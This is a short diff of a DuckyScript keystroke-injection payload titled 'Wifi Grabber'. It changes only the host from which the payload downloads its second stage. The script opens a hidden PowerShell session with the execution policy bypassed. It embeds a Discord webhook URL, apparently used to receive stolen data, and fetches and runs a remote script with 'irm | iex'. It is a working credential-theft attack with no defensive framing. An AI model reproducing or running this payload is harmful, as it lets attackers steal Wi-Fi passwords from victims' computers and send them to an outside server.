@@ -2,5 +2,5 @@ REM     Title: Wifi Grabber
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1286775145612185753/kcvYhoOJ2fzs6EG_R3pWK1UtbieJBDBhIed8zO-vWejMi8QBiQQfl68Nd75XlIZD55hC';$db='';irm http://172.234.22.120/wifigrabber.ps1 | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1286775145612185753/kcvYhoOJ2fzs6EG_R3pWK1UtbieJBDBhIed8zO-vWejMi8QBiQQfl68Nd75XlIZD55hC';$db='';irm http://myprojectfiles.com/wifigrabber.ps1 | iex
 ENTER
